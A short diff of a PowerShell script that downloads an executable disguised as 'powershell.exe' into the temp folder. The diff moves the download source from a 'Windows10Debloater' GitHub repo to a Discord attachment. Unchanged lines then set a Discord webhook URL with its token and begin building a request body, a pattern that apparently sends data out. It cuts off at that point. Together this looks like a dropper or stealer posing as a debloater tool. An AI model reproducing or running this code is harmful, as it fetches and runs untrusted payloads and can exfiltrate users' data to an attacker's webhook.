@@ -1,4 +1,4 @@
-iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/powershell.exe" -o $env:TEMP\powershell.exe
+iwr "https://cdn.discordapp.com/attachments/1008496436364718131/1008497201229607014/powershell.exe" -o $env:TEMP\powershell.exe
 
 $hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ'
 $Body = @{
